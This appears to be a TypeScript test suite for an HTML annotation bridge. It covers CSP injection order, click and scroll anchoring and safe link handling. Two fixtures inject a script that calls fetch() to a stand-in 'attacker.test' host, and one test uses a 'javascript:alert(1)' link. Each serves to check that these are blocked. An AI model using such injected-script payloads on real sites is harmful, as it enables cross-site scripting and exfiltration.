import { expect, test } from "bun:test";
import { runInNewContext } from "node:vm";
import { withAnnotationBridge } from "./annotation-bridge";

const SCRIPT_BODY = /<script>([\s\S]*?)<\/script>/;

function bridgeScript(html: string): string {
  const script = SCRIPT_BODY.exec(html)?.[1];
  if (!script) {
    throw new Error("Expected an injected bridge script.");
  }
  return script;
}

test("the collaboration bridge preserves standards mode and runs behind CSP", () => {
  const html = withAnnotationBridge(
    '<!doctype html><html><head><title>Plan</title></head><body><p id="note">Hello</p></body></html>'
  );
  expect(html.startsWith("<!doctype html>")).toBe(true);
  expect(html.indexOf("Content-Security-Policy")).toBeLessThan(
    html.indexOf("<script>")
  );
  expect(html).toContain('<p id="note">Hello</p>');
  expect(() => new Function(bridgeScript(html))).not.toThrow();
});

test("parser-confusing plan markup cannot precede the policy or bridge", () => {
  for (const html of [
    '<!-- <head> --><script>fetch("https://attacker.test")</script>',
    '<head data-x=">"><script>fetch("https://attacker.test")</script>',
  ]) {
    const secured = withAnnotationBridge(html);
    expect(secured.indexOf("Content-Security-Policy")).toBeLessThan(
      secured.indexOf("bitplan-geometry/1")
    );
    expect(secured.indexOf("bitplan-geometry/1")).toBeLessThan(
      secured.indexOf("https://attacker.test")
    );
  }
});

test("click anchors round-trip across scroll and resize, including blank space", () => {
  const handlers = new Map<string, (event: unknown) => void>();
  const messages: { type: string; payload: any }[] = [];
  let rect = {
    bottom: 180,
    height: 80,
    left: 40,
    right: 440,
    top: 100,
    width: 400,
  };
  class Element {
    id = "section";
    textContent = "A paragraph";
    closest(selector: string) {
      return selector === "a[href]" ? null : this;
    }
    getBoundingClientRect() {
      return rect;
    }
  }
  const element = new Element();
  const parent = {
    postMessage: (message: (typeof messages)[number]) => messages.push(message),
  };
  const context = {
    document: {
      addEventListener: (name: string, callback: (event: unknown) => void) =>
        handlers.set(name, callback),
      documentElement: { scrollHeight: 2000, scrollWidth: 800 },
      elementFromPoint: () => element,
      querySelectorAll: () => [element],
    },
    Element,
    innerHeight: 600,
    innerWidth: 800,
    parent,
    performance: { now: () => 1000 },
    requestAnimationFrame: (callback: () => void) => callback(),
    scrollX: 0,
    scrollY: 0,
    window: {
      addEventListener: (name: string, callback: (event: unknown) => void) =>
        handlers.set(`window:${name}`, callback),
      getSelection: () => ({ toString: () => "Selected paragraph" }),
    },
  };
  const script = bridgeScript(withAnnotationBridge("<head></head>"));
  runInNewContext(script, context);
  handlers.get("click")?.({ clientX: 140, clientY: 120, target: element });
  const anchor = messages.at(-1)?.payload.anchor;
  expect(messages.at(-1)?.type).toBe("click");
  expect(anchor.point).toEqual({ x: 0.25, y: 0.25 });
  const locate = (value: unknown) =>
    handlers.get("window:message")?.({
      data: {
        channel: "bitplan-geometry/1",
        payload: [{ anchor: value, id: "note" }],
        type: "anchors",
      },
      source: parent,
    });
  locate(anchor);
  expect(messages.at(-1)?.payload[0].position).toEqual({ x: 140, y: 120 });
  rect = {
    bottom: 120,
    height: 160,
    left: 20,
    right: 220,
    top: -40,
    width: 200,
  };
  locate(anchor);
  expect(messages.at(-1)?.payload[0].position).toEqual({ x: 70, y: 0 });
  handlers.get("click")?.({ clientX: 10, clientY: 60, target: null });
  const blank = messages.at(-1)?.payload.anchor;
  context.scrollY = 50;
  locate(blank);
  expect(messages.at(-1)?.payload[0].position).toEqual({ x: 10, y: 10 });
  const before = messages.length;
  handlers.get("contextmenu")?.({
    clientX: 70,
    clientY: 0,
    preventDefault() {
      // The bridge intentionally suppresses the native context menu.
    },
    target: element,
  });
  expect(messages.slice(before).map((message) => message.type)).toEqual([
    "click",
    "context",
  ]);
  expect(messages.at(-1)?.payload.selection).toBe("Selected paragraph");
  const afterContext = messages.length;
  handlers.get("auxclick")?.({
    button: 2,
    clientX: 70,
    clientY: 0,
    target: element,
  });
  expect(messages.length).toBe(afterContext);
  handlers.get("window:message")?.({
    data: {
      channel: "bitplan-geometry/1",
      payload: { x: 70, y: 0 },
      type: "point",
    },
    source: parent,
  });
  expect(messages.at(-1)?.payload.anchor.point).toEqual({ x: 0.25, y: 0.25 });
  expect(messages.at(-1)?.type).toBe("context");
});

test("reader-only plans open safe links natively and retain local anchors", () => {
  const handlers = new Map<string, (event: any) => void>();
  let scrolled = "";
  let focused = false;
  let top = false;
  class Element {
    attributes: Record<string, string> = { href: "https://example.com/docs" };
    closest() {
      return this;
    }
    getAttribute(name: string) {
      return this.attributes[name];
    }
    setAttribute(name: string, value: string) {
      this.attributes[name] = value;
    }
  }
  const context = {
    document: {
      addEventListener: (name: string, callback: (event: any) => void) =>
        handlers.set(name, callback),
      baseURI: "https://bitplan.dev/d/test",
      getElementById: (id: string) => id === "section one" ? {
        scrollIntoView() { scrolled = id; },
        hasAttribute() { return false; },
        setAttribute() {},
        focus() { focused = true; },
      } : null,
    },
    Element,
    URL,
    window: { scrollTo() { top = true; } },
  };
  const script = bridgeScript(withAnnotationBridge("<head></head>", false));
  runInNewContext(script, context);
  const link = new Element();
  let prevented = false;
  const click = () =>
    handlers.get("click")?.({
      preventDefault() {
        prevented = true;
      },
      target: link,
    });
  click();
  expect(link.attributes.target).toBe("_blank");
  expect(link.attributes.rel).toBe("noopener noreferrer");
  expect(prevented).toBe(false);
  link.attributes.href = "#section%20one";
  click();
  expect(prevented).toBe(true);
  expect(scrolled).toBe("section one");
  expect(focused).toBe(true);
  for (const href of ["#missing", "#bad%", "#"]) {
    prevented = false;
    link.attributes.href = href;
    click();
    expect(prevented).toBe(true);
  }
  expect(top).toBe(true);
  prevented = false;
  link.attributes.href = "/docs";
  click();
  expect(link.attributes.target).toBe("_blank");
  expect(prevented).toBe(false);
  link.attributes.href = "javascript:alert(1)";
  click();
  expect(prevented).toBe(true);
  expect(handlers.has("contextmenu")).toBe(false);
});
